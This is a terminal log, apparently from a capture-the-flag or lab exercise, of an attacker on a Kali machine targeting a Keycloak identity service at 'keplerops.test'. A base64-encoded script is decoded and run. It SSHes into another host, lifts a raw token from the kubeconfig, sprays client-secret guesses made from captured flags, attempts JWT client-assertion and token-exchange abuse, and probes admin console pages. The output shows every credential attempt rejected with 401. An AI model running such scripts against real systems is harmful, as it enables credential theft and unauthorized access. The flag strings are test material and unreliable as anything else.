@@ -1,0 +1,182 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k14_r20.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IHJvd2FuLWRldiAnYmFzaCAtcycgPDwnUlNIJwpzZXQgK2UKST1odHRwczovL2lkZW50aXR5LmtlcGxlcm9wcy50ZXN0CmVjaG8gIj09PSBXRUxMIEtOT1dOIGtlcGxlcm9wcyA9PT0iCmN1cmwgLXNTayAtbSA4ICIkSS9yZWFsbXMva2VwbGVyb3BzLy53ZWxsLWtub3duL29wZW5pZC1jb25maWd1cmF0aW9uIiB8IHB5dGhvbjMgLW0ganNvbi50b29sIDI+JjEgfCBoZWFkIC04MAplY2hvICI9PT0gV0VMTCBLTk9XTiBtYXN0ZXIgPT09IgpjdXJsIC1zU2sgLW0gOCAiJEkvcmVhbG1zL21hc3Rlci8ud2VsbC1rbm93bi9vcGVuaWQtY29uZmlndXJhdGlvbiIgfCBweXRob24zIC1tIGpzb24udG9vbCAyPiYxIHwgaGVhZCAtNDAKZWNobyAiPT09IFJFQUxNIGtlcGxlcm9wcyBkZXRhaWwgPT09IgpjdXJsIC1zU2sgLW0gOCAiJEkvcmVhbG1zL2tlcGxlcm9wcyIgfCBweXRob24zIC1tIGpzb24udG9vbCAyPiYxIHwgaGVhZCAtNDAKVD0iJEkvcmVhbG1zL2tlcGxlcm9wcy9wcm90b2NvbC9vcGVuaWQtY29ubmVjdC90b2tlbiIKVz0iRkxBR3s2YmI2NjA3NGYyMzI1NDA1fSIKVzI9IkZMQUd7YWRmYmFiZGNkYWNhOThhY30iCkpXVD0kKGt1YmVjdGwgY29uZmlnIHZpZXcgLS1yYXcgLW8ganNvbnBhdGg9J3sudXNlcnNbMF0udXNlci50b2tlbn0nKQplY2hvICI9PT0gQ0xJRU5UIENSRURFTlRJQUxTIEdVRVNTRVMgPT09Igpmb3IgYyBpbiByb3dhbi13b3Jrc3BhY2UgZmllbGRsaW5rLXdvcmtzcGFjZSBmaWVsZGtlc3Qtd29ya3NwYWNlIHdvcmtzcGFjZSBmaWVsZGxpbmstd29ya2xvYWQgd29ya2xvYWQgc3VwcG9ydC1leHBvcnQgc3VwcG9ydC1leHBvcnQtcmVhZGVyIHN1cHBvcnQgcm93YW47IGRvCiBmb3IgcyBpbiAiJFciICIkVzIiOyBkbwogIHI9JChjdXJsIC1zU2sgLW0gOCAtbyAvdG1wL28gLXcgJyV7aHR0cF9jb2RlfScgLWQgImdyYW50X3R5cGU9Y2xpZW50X2NyZWRlbnRpYWxzJmNsaWVudF9pZD0kYyZjbGllbnRfc2VjcmV0PSRzIiAiJFQiKQogIGVjaG8gIi0tIGNsaWVudD0kYyBzZWNyZXQ9JHtzOjA6MTB9Li4gLT4gJHIgOjogJChoZWFkIC1jIDIyMCAvdG1wL28gfCB0ciAnXG4nICcgJykiCiBkb25lCmRvbmUKZWNobyAiPT09IEpXVCBBUyBDTElFTlQgQVNTRVJUSU9OID09PSIKZm9yIGMgaW4gcm93YW4td29ya3NwYWNlIGZpZWxkbGluay13b3JrbG9hZCB3b3JrbG9hZCBzdXBwb3J0LWV4cG9ydC1yZWFkZXI7IGRvCiByPSQoY3VybCAtc1NrIC1tIDggLW8gL3RtcC9vIC13ICcle2h0dHBfY29kZX0nIC1kICJncmFudF90eXBlPWNsaWVudF9jcmVkZW50aWFscyZjbGllbnRfaWQ9JGMmY2xpZW50X2Fzc2VydGlvbl90eXBlPXVybjppZXRmOnBhcmFtczpvYXV0aDpjbGllbnQtYXNzZXJ0aW9uLXR5cGU6and0LWJlYXJlciZjbGllbnRfYXNzZXJ0aW9uPSRKV1QiICIkVCIpCiBlY2hvICItLSBjbGllbnQ9JGMgand0IC0+ICRyIDo6ICQoaGVhZCAtYyAyMjAgL3RtcC9vfHRyICdcbicgJyAnKSIKZG9uZQplY2hvICI9PT0gUkZDODY5MyBUT0tFTiBFWENIQU5HRSB3aXRoIEpXVCA9PT0iCmZvciBhIGluIHN1cHBvcnQua2VwbGVyb3BzLnRlc3Qgc3VwcG9ydC1leHBvcnQtcmVhZGVyIGZpZWxkbGluay13b3JrbG9hZCByb3dhbi13b3Jrc3BhY2U7IGRvCiByPSQoY3VybCAtc1NrIC1tIDggLW8gL3RtcC9vIC13ICcle2h0dHBfY29kZX0nIC1kICJncmFudF90eXBlPXVybjppZXRmOnBhcmFtczpvYXV0aDpncmFudC10eXBlOnRva2VuLWV4Y2hhbmdlJmNsaWVudF9pZD1yb3dhbi13b3Jrc3BhY2Umc3ViamVjdF90b2tlbj0kSldUJnN1YmplY3RfdG9rZW5fdHlwZT11cm46aWV0ZjpwYXJhbXM6b2F1dGg6dG9rZW4tdHlwZTpqd3QmYXVkaWVuY2U9JGEiICIkVCIpCiBlY2hvICItLSBhdWRpZW5jZT0kYSAtPiAkciA6OiAkKGhlYWQgLWMgMjYwIC90bXAvb3x0ciAnXG4nICcgJykiCmRvbmUKZWNobyAiPT09IEFDQ09VTlQvQ09OU09MRSBQQUdFUyA9PT0iCmZvciBwIGluIC9yZWFsbXMva2VwbGVyb3BzL2FjY291bnQvIC9yZWFsbXMvbWFzdGVyL2NvbnNvbGUvIC9hZG1pbi9tYXN0ZXIvY29uc29sZS8gL3JlYWxtcy9rZXBsZXJvcHMvcHJvdG9jb2wvb3BlbmlkLWNvbm5lY3QvY2VydHMgL3JlYWxtcy9rZXBsZXJvcHMvLndlbGwta25vd24vb3BlbmlkLWNvbmZpZ3VyYXRpb247IGRvCiBlY2hvICItLSAkcCI7IGN1cmwgLXNTayAtbSA3IC1vIC9kZXYvbnVsbCAtdyAnJXtodHRwX2NvZGV9XG4nICIkSSRwIgpkb25lClJTSAplY2hvIERPTkVfSzE0X1IyMAo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k14_r20.sh; bash /tmp/k14_r20.sh; echo DONEMARK_1795201491122$((6*7))
+=== WELL KNOWN keplerops ===
+{
+    "issuer": "https://identity.keplerops.test/realms/keplerops",
+    "authorization_endpoint": "https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/auth",
+    "token_endpoint": "https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/token",
+    "introspection_endpoint": "https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/token/introspect",
+    "userinfo_endpoint": "https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/userinfo",
+    "end_session_endpoint": "https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/logout",
+    "frontchannel_logout_session_supported": true,
+    "frontchannel_logout_supported": true,
+    "jwks_uri": "https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/certs",
+    "check_session_iframe": "https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/login-status-iframe.html",
+    "grant_types_supported": [
+        "authorization_code",
+        "client_credentials",
+        "implicit",
+        "password",
+        "refresh_token",
+        "urn:ietf:params:oauth:grant-type:device_code",
+        "urn:ietf:params:oauth:grant-type:token-exchange",
+        "urn:ietf:params:oauth:grant-type:uma-ticket",
+        "urn:openid:params:grant-type:ciba"
+    ],
+    "acr_values_supported": [
+        "0",
+        "1"
+    ],
+    "response_types_supported": [
+        "code",
+        "none",
+        "id_token",
+        "token",
+        "id_token token",
+        "code id_token",
+        "code token",
+        "code id_token token"
+    ],
+    "subject_types_supported": [
+        "public",
+        "pairwise"
+    ],
+    "prompt_values_supported": [
+        "none",
+        "login",
+        "consent"
+    ],
+    "id_token_signing_alg_values_supported": [
+        "PS384",
+        "RS384",
+        "EdDSA",
+        "ES384",
+        "HS256",
+        "HS512",
+        "ES256",
+        "RS256",
+        "HS384",
+        "ES512",
+        "PS256",
+        "PS512",
+        "RS512"
+    ],
+    "id_token_encryption_alg_values_supported": [
+        "ECDH-ES+A256KW",
+        "ECDH-ES+A192KW",
+        "ECDH-ES+A128KW",
+        "RSA-OAEP",
+        "RSA-OAEP-256",
+        "RSA1_5",
+        "ECDH-ES"
+    ],
+    "id_token_encryption_enc_values_supported": [
+        "A256GCM",
+        "A192GCM",
+        "A128GCM",
+        "A128CBC-HS256",
+        "A192CBC-HS384",
+        "A256CBC-HS512"
+    ],
+    "userinfo_signing_alg_values_supported": [
+        "PS384",
+        "RS384",
+=== WELL KNOWN master ===
+{
+    "issuer": "https://identity.keplerops.test/realms/master",
+    "authorization_endpoint": "https://identity.keplerops.test/realms/master/protocol/openid-connect/auth",
+    "token_endpoint": "https://identity.keplerops.test/realms/master/protocol/openid-connect/token",
+    "introspection_endpoint": "https://identity.keplerops.test/realms/master/protocol/openid-connect/token/introspect",
+    "userinfo_endpoint": "https://identity.keplerops.test/realms/master/protocol/openid-connect/userinfo",
+    "end_session_endpoint": "https://identity.keplerops.test/realms/master/protocol/openid-connect/logout",
+    "frontchannel_logout_session_supported": true,
+    "frontchannel_logout_supported": true,
+    "jwks_uri": "https://identity.keplerops.test/realms/master/protocol/openid-connect/certs",
+    "check_session_iframe": "https://identity.keplerops.test/realms/master/protocol/openid-connect/login-status-iframe.html",
+    "grant_types_supported": [
+        "authorization_code",
+        "client_credentials",
+        "implicit",
+        "password",
+        "refresh_token",
+        "urn:ietf:params:oauth:grant-type:device_code",
+        "urn:ietf:params:oauth:grant-type:token-exchange",
+        "urn:ietf:params:oauth:grant-type:uma-ticket",
+        "urn:openid:params:grant-type:ciba"
+    ],
+    "acr_values_supported": [
+        "0",
+        "1"
+    ],
+    "response_types_supported": [
+        "code",
+        "none",
+        "id_token",
+        "token",
+        "id_token token",
+        "code id_token",
+        "code token",
+        "code id_token token"
+    ],
+    "subject_types_supported": [
+        "public",
+        "pairwise"
+    ],
+=== REALM keplerops detail ===
+{
+    "realm": "keplerops",
+    "public_key": "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7VRjZ1KSQ3TxC3QTHO/C0tZehy09Ewap3j7v+IMWL06nJn0ekHcy0mPNReA57SxmcIuiXy/ARfPfAx4q8x0gil+58WpEehc19nFPPX9xv35obAzOeAw4PZ9H80q1juyyHQS/yo3Kjf81BOP6t9hLb3WQCMcMoE1y6Wpsj/T5HYawS5E1JNpXRESphc7KBuXrm1nFmvDANoPIsWYkNp+dtIlcdR5YPJS4gt4uxwOoXiIVvtBYqzGHFoqjIK2X+TNcsk0cPGBwXLHVzMxtSAQVZUmoYmL0MZ44fNl8FJwTZL3RpOkJq6A8hWBL3jiGa/ArJ6fvDlPmpupzp2tpHTtRbwIDAQAB",
+    "token-service": "https://identity.keplerops.test/realms/keplerops/protocol/openid-connect",
+    "account-service": "https://identity.keplerops.test/realms/keplerops/account",
+    "tokens-not-before": 0
+}
+=== CLIENT CREDENTIALS GUESSES ===
+-- client=rowan-workspace secret=FLAG{6bb66.. -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=rowan-workspace secret=FLAG{adfba.. -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=fieldlink-workspace secret=FLAG{6bb66.. -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=fieldlink-workspace secret=FLAG{adfba.. -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=fieldkest-workspace secret=FLAG{6bb66.. -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=fieldkest-workspace secret=FLAG{adfba.. -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=workspace secret=FLAG{6bb66.. -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=workspace secret=FLAG{adfba.. -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=fieldlink-workload secret=FLAG{6bb66.. -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=fieldlink-workload secret=FLAG{adfba.. -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=workload secret=FLAG{6bb66.. -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=workload secret=FLAG{adfba.. -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=support-export secret=FLAG{6bb66.. -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=support-export secret=FLAG{adfba.. -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=support-export-reader secret=FLAG{6bb66.. -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=support-export-reader secret=FLAG{adfba.. -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=support secret=FLAG{6bb66.. -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=support secret=FLAG{adfba.. -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=rowan secret=FLAG{6bb66.. -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=rowan secret=FLAG{adfba.. -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+=== JWT AS CLIENT ASSERTION ===
+-- client=rowan-workspace jwt -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=fieldlink-workload jwt -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=workload jwt -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- client=support-export-reader jwt -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+=== RFC8693 TOKEN EXCHANGE with JWT ===
+-- audience=support.keplerops.test -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- audience=support-export-reader -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- audience=fieldlink-workload -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+-- audience=rowan-workspace -> 401 :: {"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}
+=== ACCOUNT/CONSOLE PAGES ===
+-- /realms/keplerops/account/
+200
+-- /realms/master/console/
+404
+-- /admin/master/console/
+200
+-- /realms/keplerops/protocol/openid-connect/certs
+200
+-- /realms/keplerops/.well-known/openid-configuration
+200
+DONE_K14_R20
